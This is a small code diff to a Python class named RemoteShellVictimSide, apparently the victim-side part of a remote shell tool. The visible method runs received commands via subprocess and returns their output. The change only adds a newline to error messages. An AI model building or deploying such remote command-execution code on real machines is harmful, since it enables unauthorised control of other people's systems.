@@ -53,7 +53,7 @@ class RemoteShellVictimSide:
             result = subprocess.run(command, capture_output=True)
         except Exception as e:
             print("exceptoin")
-            self.__send_output(str(e).encode())
+            self.__send_output((str(e)+'\n').encode())
         else:
             self.__send_output(result.stdout + result.stderr)
 
